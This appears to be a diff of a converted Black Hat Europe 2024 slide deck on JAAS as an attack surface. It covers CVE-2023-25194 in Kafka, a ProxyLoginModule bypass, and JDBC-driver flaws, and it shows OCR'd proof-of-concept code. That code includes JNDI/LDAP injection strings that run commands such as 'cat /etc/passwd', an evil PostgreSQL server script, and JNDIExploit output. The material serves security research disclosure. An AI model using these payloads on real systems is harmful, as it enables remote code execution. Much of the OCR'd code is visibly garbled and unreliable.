@@ -8,19 +8,24 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/ZiYang Li & Ji'an Zhou & Ying Zhu_A Novel Attack Surface Java Authentication and Authorization Service (JAAS).pdf"
 pages: 125
 sha256: "bfc0a664f815883e2236e095e3ecdfdbfd6497002cab83085a3c922e9a522aca"
-text_chars: 43346
+text_chars: 37928
 ocr_pages: 34
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.7
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:48:46Z"
+converted_at: "2026-08-12T05:02:59Z"
 ---
 # A Novel Attack Surface Java Authentication and Authorization Service (JAAS)
 
 **Speakers:** ZiYang Li, Ji'an Zhou, Ying Zhu  
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/ZiYang Li & Ji'an Zhou & Ying Zhu_A Novel Attack Surface Java Authentication and Authorization Service (JAAS).pdf` (125 pages)
+
 
 ## Slide 1
 
@@ -140,22 +145,18 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 1.2 How to use JAAS
 Run the sample code
 /Library/Java/JavaVirtualMachines/jdk1.8.0_291.jdk
 user name: admin
 password: admin123
 Authentication succeeded!
-EA :
 +—ARP: SamplePrincipal: admin
 Process finished with exit code 0
-Information Classification: General
 ```
 
 ## Slide 8
@@ -240,28 +241,22 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 1.3 How does JAAS work
 public static void main(String[] args) throws Exception{
 String propertyName = "java.security.auth. login.config";
 System.setProperty(propertyName, "sample_jaas.config");
 . LoginContext lc = new LoginContext("Sample", new MyCallbackHandler());
 SampleAcn.main Te. login();
-System. out.println("Authentication succeeded!");
 Subject subject = lc.getSubject();
-System. out.println(subject);
 }
 Sample {
 samp le.module.SampleLoginModule required
 sample_jaas.conf username = “admin"
 password = “admin123";
-i
-Information Classification: General
 ```
 
 ## Slide 13
@@ -298,19 +293,16 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 1.3 How does JAAS work
 SampleAcn.main
 — LoginContext.login
 @ instantiate |
 Subject @ construct ee Ay
 LoginContext SampleLoginModule
-Information Classification: General
 ```
 
 ## Slide 16
@@ -365,24 +357,18 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 1.3 How does JAAS work
-® Rectertats.
 a @ construct Cj
 —@ initialize with Subject, CallbackHandler, options-> —B
-@ login
 LoginContext SampleLoginModule
 © handle
 @ return username, pwd
 —7 <—__————-© obtain username, pwd >
-aa
 MyCallbackHandler user
-Information Classification: General
 ```
 
 ## Slide 20
@@ -421,24 +407,18 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 1.3 How does JAAS work
 The process of a
-a @ construct 0
 —@ initialize with Subject, CallbackHandler, options “AB
 ® login
-LoginContext «—————-© commit, polulate Subject» Samp leLoginModule
 © handle
 @ return username, pwd
 — <—_© obtain username, pwd >
-2) :
 MyCallbackHandler user
-Information Classification: General
 ```
 
 ## Slide 23
@@ -497,31 +477,25 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.1 CVE-2023-25194
 PoC
 public static void main(String[] args) throws Exception{
 Properties properties = new Properties();
-properties.put("bootstrap.servers", "127.0.0.1:1234");
 String deserializer = "org.apache.kafka.common.serialization.StringDeserializer";
 properties.put("key.deserializer", deserializer);
 properties.put("value.deserializer", deserializer);
 properties.put("sasl.mechanism", "PLAIN");
-properties. put("security.protocol", "SASL_SSL"); Attacker-controlled
 String jaasConfig = “com.sun.security.auth.module.JndiLoginModule required\n" +
 "user.provider.url=" +
 "\" Ldap: //lLocalhost/hhy LKPnySW/P Lain/Exec/eyJj bwWQi0iJ j YXQgL2VOYy9wYXNzd2QifQ==\"\n" +
 "useFirstPass=\"true\"\n" +
-"group.provider.url=\"Xxx\";";
 properties.put("sasl.jaas.config", jaasConfig);
 KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
 kafkaConsumer.close();
-Information Classification: General
 ```
 
 ## Slide 27
@@ -536,12 +510,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.1 CVE-2023-25194
 Run the PoC
 JNDI
@@ -549,14 +521,11 @@ Caused by: javax.security.auth. login. Create breakpoint : User not found
 mn at com.sun.security.auth.module.JndiLoginModule.attemptAuthentication( )
 at com.sun.security.auth.module. JndiLoginModule. Login( ) <4 internal lLines>
 v at javax.security.auth. Login. LoginContext.invoke( )
-=) at javax.security.auth. login. LoginContext.access$000( )
 it at javax.security.auth. login. LoginContext$4.run( )
--—t at javax.security.auth. login. LoginContext$4.run( ) <1 internal lLine>
 Z at javax.security.auth. Login. LoginContext.invokePriv( )
 at javax.security.auth. Login. LoginContext.Login( )
 at org.apache.kafka.common.security.authenticator.AbstractLogin. Login( )
 ‘S Nothing but an exception
-Information Classification: General
 ```
 
 ## Slide 28
@@ -589,31 +558,23 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.1 CVE-2023-25194
 © Are you familiar with it?
 public static void main(String[] args) throws Exception{
 Properties properties = new Properties();
-properties. put("bootstrap.servers", "127.0.0.1:1234");
 String deserializer = "org.apache.kafka.common.serialization.StringDeserializer";
-properties. put("key.deserializer", deserializer) ;
 properties.put("value.deserializer", deserializer);
-properties. put("sasl.mechanism", "PLAIN");
 properties.put("security.protocol", "SASL_SSL");
 String jaasConfig = "com.sun.security.auth.module.JndiLoginModule required\n" +
 "user.provider.url=" +
-"\" Ldap: //localhost/hhy \KPnySW/Plain/Exec/eyJ j bwQi0iJ j YXQgL2VOYy9wYXNzd2QifQ==\"\n" +
 "useFirstPass=\"true\"\n" +
-"group.provider.url=\"xxx\"3 "5
 properties.put("sasl.jaas.config", jaasConfig);
 KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties);
 kafkaConsumer.close();
-Information Classification: General
 ```
 
 ## Slide 30
@@ -660,12 +621,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.2 Similarities and differences
 Debugging the PoC
 public LoginContext login() throws LoginException {
@@ -673,23 +632,14 @@ loginContext = new LoginContext(contextName, (@@SE8Bnvi1, loginCallbackHandler, 
 LoginContext.login();
 Log.info("Successfully logged in.");
 return LoginContext;
-}
 Debug: 4 JNDI
-@ Debugger Console = &@A + tT ™
 ¥ "main"@1 in group "main": RUNNING Yi.
 this = {DefaultLogin@1397}
-Information Classification: General
 D> © login:59, AbstractLogin (org.apache.kafka.common.security.authenticator) >
 (org.apache.kafka.common.security.authenticator >
-(org.apache.kafka.common.secui >
 a (org.apache.kafka.common.network) >
-° (org.apache.kafka.common.network)
-(org.apache.kafka.common.netwt
-B (org.apache.kafka.clients)
 re (org.apache.kafka.clients.consumer)
-(org.apache.kafka.clients.consumer)
 x (org.apache.kafka.clients.consumer)
-} (org.apache.kafka.clients.consumer)
 Rp main:22, JNDI (kafka)
 contextName = "KafkaClient"
 loginCallbackHandler = {AbstractLogin$DefaultLoginCallbac
@@ -779,12 +729,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.3 The principle of CVE-2023-25194
 JndiLoginModule.login
 private void attemptAuthentication(boolean getPasswdFromSharedState)
@@ -798,9 +746,7 @@ InitialContext iCtx = new InitialContext();
 | + "Idap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQiOiJj YXQgL2VOYy9wYXNzd2QifQ==" |
 |
 Debug: | JNDI
-@ Debugger Console =| & + * % A
 * "main"@1 in group "main": RUNNING Yv
-Information Classification: General
 )p| © attemptAuthentication:526, JndiLoginModule (com.sun.security.auth.modt
 (com.sun.security.auth.module)
 (sun.reflect)
@@ -853,17 +799,13 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.3 The principle of CVE-2023-25194
 The attack process
 JVM
-@ fostentiatesty
-he © construct oO
 —@ initialize with Subject, CallbackHandler, options -H5
 @® login
 LoginContext JndiLoginModule
@@ -871,13 +813,8 @@ t
 @® set config & login
 ® lookup
 Kafka client
-+ ;
 @ connection string © payload
 @ taken over Bw
-a —<— ee)
-Kt
-7)
-Information Classification: General
 Attacker Evil JNDI Server
 ```
 
@@ -901,12 +838,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.3 The principle of CVE-2023-25194
 Run the sample code again
 © SampleAcn.java
@@ -915,60 +850,34 @@ String propertyName = "java.security.auth.login.config";
 System.setProperty(propertyName, "sample_jaas.config");
 LoginContext lc = new LoginContext( name: "Sample", new MyCallb
 lc.login();
-System.out.println("Authentication succeeded!");
 Subiect subiect = 1lc.aetSubiect():
 <2, sample_jaas.config
 Sample {
 com.sun.security.auth.module.JndiLoginModule required
-user. provider.url="ldap://Localhost/hhylKPnySW/Plain/Exec/eyJjbWQi0
 useFirstPass="true"
-group. provider. url="Xxxx";
-be
 Run: SampleAcn
 Exception in thread "main" javax.security.auth. login. pi
 at com.sun.security.auth.module.JndiLoginModule.attemptAuthentical
 at com.sun.security.auth.module.JndiLoginModule.login( of
 auth.
-auth. Login.
 auth.
-auth. Login.
 auth.
 auth
-»
-€>
 at javax.security. Login. LoginContext.invoke(
 security. LoginContext.access$000(
-j-
 at javax.
-ke
 at javax.security. Login. LoginContext$4.run(
 security. LoginContext$4.run(
->
 at javax.
 a} qi
 security. Login. LoginContext.invokePriv(
-I+
-i"
 at javax.
-- at
-Information Classification: General
 javax.security. - Login. LoginContext.loqgin(
-jo
 JNDInjector v1.1
-HK
-HOST: localhost RELIP HTTP O: 80 LDAPi®O: 389
 ARS RAS : @ LDAP HTTP
-() X2ISA (127.0.0.1] ALDAPIR :|hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VOY y9wY XNzd2QifQ==
-[!] LDAPiBRi¥6 :
-RWS : hhyliKPnySw
 Gadget : Plain
 Payload : Exec
-SHR:
 {"cmd":"cat /etc/passwd"}
-[!] IE# Rik codebase:http://localhost/MTI3LjAUMC4x/hhylKPnySW/Plain/Exec/eyJjbW QiOiJjYXQgL2VOY yQwY x!
-(!] KAIHTTPIAR : /MTISLJAUMC4x/hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2V0Yy9wY XNzd2QifQ==/Exeq
-() ABR [MTISL|AUMC4x]) HELE
-Hit
 # User Database
 #
 # Note that this file is consulted directly only when the system is running
@@ -991,12 +900,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.3 The principle of CVE-2023-25194
 The attack process
 JVM
@@ -1007,7 +914,6 @@ lens —@ initialize with Subject, CallbackHandler, options-> H5
 LoginContext JndiLoginModule
 A
 ® set config & login
-Ee
 [2ava lookup
 Kafka client SampleAcn,java
 @ evil login config © payload
@@ -1015,7 +921,6 @@ Kafka client SampleAcn,java
 Bw taken over
 | <5.
 Information Classification: General Attacker Evil JNDI Server
-EU.
 ```
 
 ## Slide 48
@@ -1050,32 +955,25 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.4 The patch of CVE-2023-25194
 How the patch works
 JVM
-® eam
 aie © construct F)
 —@ initialize with Subject, CallbackHandler, options-> ba
 login >
 LoginContext JndiLoginModule
 t
 @ set config & login
-<_——
 ® check login config
-er)
 Kafka client
 A
 T
 @ connection string
-o
 Information Classification: General Attacker Evil JNDI Server
-LE
 ```
 
 ## Slide 51
@@ -1098,12 +996,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.5 The first idea to bypass
 Goal: Find other LoginModules
 JVM
@@ -1113,15 +1009,11 @@ Subject © construct
 @® login >
 LoginContext ?LoginModule
 © set config & login i sais
-1
 @ check login config
-pie eel
 Kafka client
 @ connection string
-Lc]
 ns © taken over
 Attacker
-Information Classification: General
 ```
 
 ## Slide 53
@@ -1146,12 +1038,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.5 The first idea to bypass
 ProxyLoginModule
 public void initialize(Subject subject,
@@ -1168,7 +1058,6 @@ var8.printStackTrace(); 4G truct © logi
 ee @ construc © login
 } &initialize
 this.delegate.initialize(subject, callbackHandler, sharedState, options);
-O
 public boolean login() throws LoginException {
 @ @
 return this.delegate. login(); @ ®
@@ -1185,16 +1074,12 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 Run:
 - t
-+
-Information Classification: General
 }
 2.5 The first idea to bypass
 RCE via ProxyLoginModule
@@ -1203,8 +1088,6 @@ String jaasConfig = "org.jboss.security.auth.spi.ProxyLoginModule required\n" +
 "user.provider.url=" +
 "\"Ldap://LocalLhost/hhylKPnySW/PLain/Exec/eyJjbWQi0iJjYXQgL2VOYy9wYXNzd2QifQ==\"\n" +
 “useFirstPass=\"true\"\n" +
-"group.provider.url=\"Xxxx\";";
-System.out.println(jaasConfig);
 properties.put("sasl.jaas.config", jaasConfig);
 KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties);
 kafkaConsumer.close();
@@ -1215,8 +1098,6 @@ by: javax.security.auth. login. Create breakpoint : User not found
 com.sun.security.auth.module.JndiLoginModule.attemptAuthentication( )
 at
 at
-com.sun.security.auth.module.JndiLoginModule. lLogin( ! )
-org. jboss.security.auth.spi.ProxyLoginModule. lLogin(P )| <4 internal Lines>
 ```
 
 ## Slide 56
@@ -1231,24 +1112,16 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat = +
 EUROPE 2024 /
 2.9 The first idea to bypass
-[QHTTP ARS RR , EE Tie O80...
-[!] LDAP ARS RR , TEES OTe 389...
-(!] WENA (127.0.0.1] BLDAPIBR : hhyiKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VOY y9wY XNzd2QifQ==
-[!] LDAPiBRi¥1é :
-R4S : hhyiKPnySwW
 Gadget : Plain
 Payload : Exec
 SR:
 {"cmd":"cat /etc/passwd"}
-[!] IE#E RiKcodebase:http://localhost/MTI3LjAuUMC4x/hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VO0Yy9wY XNzd2QifQ==
-[!] KBIHTTPISR : /MTI3Lj{AUMC4x/hhylIKPnySW/Plain/Exec/eyJjbW QiOiJjYXQgL2VOY y9wY XNzd2QifQ==/Exec.class
-() ABR [MTISL|AUMC4x] HABER :
 ##
 # User Database
 #
@@ -1261,7 +1134,6 @@ it
 ##
 nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false es)
 root:*:0:0:System Administrator:/var/root:/bin/sh
-Information Classification: General
 ```
 
 ## Slide 57
@@ -1274,35 +1146,25 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 2.5 The first idea to bypass
 The attack process
 © instantiate |
 Subject © construct oO
 fice. —@ initialize with Subject, CallbackHandler, options H5
 © login >
-LoginContext r— ProxyLoginModule
 t |
 @ set config & login ® construct = @ login
 JVM
 &initialize |
-: O
 @® check login config
-ee SY
 Kafka client JNDILoginModule
-I
 4 1) lookup
-@ connection string o :
-\ 13) taken over Bw
-Eee
 |
 Attacker Evil JNDI Server
-Information Classification: General
 ```
 
 ## Slide 58
@@ -1551,18 +1413,13 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 JAAS is widely used.
 Go gle "jaas" "authentication" x
-{=
-a)
-Jo)
 e« IBM
 = https://www.ibm.com > rzaha > rzahajaas10 - Fuh:
 Java Authentication and Authorization Service (JAAS) 1.0
@@ -1578,7 +1435,6 @@ https://docs.hazelcast.com > security » jaas-a... - BZubH
 JAAS Authentication
 The jaas authentication setting is the most flexible form of authentication, but requires
 knowledge of JAAS login modules and related concepts. You can use ...
-Information Classification: General
 ```
 
 ## Slide 75
@@ -1615,18 +1471,15 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 Summarize sinks
 new LoginContext(?, ?, ?, Configuration) //Configuration -> attacker-controlled
 System.setProperty("java.security.auth. login.config", "<attacker-controlled>")
 System.setProperty("login.config.url.${numeric}", "<attacker-controlled>")
-Information Classification: General
 ```
 
 ## Slide 78
@@ -1637,18 +1490,14 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 Why they work
 new LoginContext(?, ?, ?, Configuration) //Configuration -> attacker-controlled
-System. setProperty("java.security.auth. login.config", "<attacker-—controlled>")
 System.setProperty("login.config.url.${numeric}", "<attacker-controlled>")
-Information Classification: General
 ```
 
 ## Slide 79
@@ -1661,23 +1510,18 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 public static void main(String[] args) throws Exception{
 String propertyName = "java.security.auth. login.config";
-Information Classification: General
 System. setProperty(propertyName,
-"http: //<remote_host>/sample_jaas.config");
 LoginContext lc = new LoginContext("Sample", new MyCallbackHandler());
 lc. login();
 System.out.println("Authentication succeeded!");
 Subject subject = lc.getSubject();
-System.out.println(subject);
 It can be a remote address!
 ```
 
@@ -1691,20 +1535,15 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 Download Java libs in bulk
 Maver
-. Google
-> Bing
 N
 <APACHE ANT>
-Information Classification: General
 ```
 
 ## Slide 81
@@ -1715,21 +1554,15 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.2 How we hunted bugs
 Analyze automatically and manually
-2)
-;
 filter1: keywords & tags
 ay 4 filter2: static program analysis
 filter3: code review
-0;
-Information Classification: General
 ```
 
 ## Slide 82
@@ -1754,12 +1587,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.3 What we found
 Evil PostgreSQL Server
 import socket, binascii, os
@@ -1767,11 +1598,9 @@ def receive_data(conn):
 data = conn. recv(1024)
 print("[*] Receiveing the package : {}".format(data) )
 return str(data).lower()
-if _name_ == '_ main_':
 def send_data(conn, data): HOST = '0.0.0.0'
 print("[%*] Sending the package : {}".format(binascii.a2b_hex(data) )) PORT = 3307
 conn. send(binascii.a2b_hex(data) ) sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sk. setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 def run(): sk.bind((HOST, PORT) )
 nossl = "4e" sk. Listen(1)
 kerb_login = "520000000c00000007cb99217e" print("start evil pgsql server listening on {}:{}".format(HOST, PORT) )
@@ -1783,8 +1612,6 @@ send_data(conn, noss1l)
 data = receive_data(conn)
 send_data(conn, kerb_login)
 data = receive_data(conn)
-print (data)
-Information Classification: General
 ```
 
 ## Slide 84
@@ -1797,35 +1624,24 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.3 What we found
 The attack process
 @ setup
-’
 Evil PostgreSQL Evil HTTP Server
 Server
-h '
 © connect ® read login config file
 |
-—_|—_>
 +2 taken over
 Attacker JDBC driver car JAAS (Dk vere
 © authenticate
-ete login config URL &
-I
 lookup
-v
 JVM
 —>|
 @ payload
-(=<) id
-© set up _——) :
-0)
 Information Classification: General Evil JNDI Server
 ```
 
@@ -1837,14 +1653,13 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Ba *
 black hat hes
 EUROPE 2024 4
 3.3 What we found
-Information Classification: General
 ```
 
 ## Slide 86
@@ -1887,20 +1702,16 @@ HTTP Server
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.3 What we found
 Run the PoC
-© Impala.java $ Terminal: Local Local (2) a NA fey
 public class Impala { v test@l ! JNDIExploit1.4 % java -jar JNDIExploit.jar -i localhost
 public static void main(String[] args) throws Exception { [+] LDAP Server Start Listening on 1389...
 String url = "jdbc:impala://127.0.0.1:8000;AuthMech=1;KrbAuthType=1;" + [+] HTTP Server Start Listening on 3456... J N D| Server
 "KrbRealm=HADOOP. COM; KrbHostFQDN=host;KrbServiceName=impala;" + [+] Received LDAP Query: Basic/Command/open -a Calculator
-"krbJAASFile=http://127.0.0.1:8000/impala. conf"; [+] Paylaod: command
 DriverManager.getConnection(url); [+] Command: open -a Calculator
 } [+] Sending LDAP ResourceRef result for Basic/Command/open -a Calculator with basi
 } c remote reference payload
@@ -1914,16 +1725,11 @@ riffff:127.0.0.1 - - [25/Nov/2024 13:39:49] "GET /impala.conf HTTP/1.1" 200 -
 com.sun.security.auth.module.JndiLoginModule required
 user. provider.url="ldap://localhost:1389/Basic/Command/open -a Calculator" J
 useFirstPass="true"
-group. provider.url="xxx";
-i;
 Run: Impala fo
-t at com.cloudera. impala. jdbc.common.BaseConnectionFactory.doConnect( )
 at com.cloudera.impala.jdbc.common.AbstractDriver.connect( )
-“A |S at java.sql.DriverManager.getConnection( )
 at java.sql.DriverManager.getConnection( )
 le vl
 at example.Impala.main(Impala. java:10)
-Information Classification: General
 ```
 
 ## Slide 89
@@ -1936,28 +1742,20 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 3.3 What we found
 The attack process
 Evil HTTP Server @ read login config file
 r—@ parse URL JVM
 <TC) at ( —-© set login config url—> G
-= 6) JDBC URE@———|= aN =—)
 y <+—1) taken over : © login > ——
 Attacker Impala JDBC r— JAAS JDK)
 driver authenticate
-Poe ae
-|
 © lookup
-a= @@
 | ___@ payload
-a
-setup Sry
 Information Classification: General Evil JNDI Server
 ```
 
@@ -2223,22 +2021,16 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 4.1 Take over cloud services
 C)
 Alibaba Cloud
-r amazon
 webservices
 Google
-Cloud4C_
 , TIER 4 CLOUD
-— Ef Microsoft Azure
-Information Classification: General
 ```
 
 ## Slide 107
@@ -2313,12 +2105,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'*)
-black hat
-EUROPE 2024
 Server
 Connect by:
 URL:
@@ -2328,9 +2118,7 @@ Database:
 Step 2: Exploit the vulnerabilities
 Main Driver properties SSH Proxy SSL
 Host © URL
-jdbc:dog;://127.0.0.1:8000;foo=1;bar=1;configFile=http://1 27.0.0.1:8000/dog.conf{
 Test Connection ... < Back
-Information Classification: General
 Cancel
 Port:
 Add Kafka Data Source
@@ -2346,7 +2134,6 @@ Properties :
 SASL_PLAINTEXT
 GSSAPI(Kerberos) @) PLAIN SCRAM-256 SCRAM-512
 {'sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required
-user.provider.url=\"Idap://localhost/hhylKPnySW/Plain/Exec/ey)jbWQiOiJjYXQgL2VOYy9wYXNzd
 2QifQ==\" useFirstPass=\"true\" group.provider.url=\"xxx\";"}
 Previous Step
 A complete
@@ -2362,25 +2149,14 @@ Information Classification: General
 
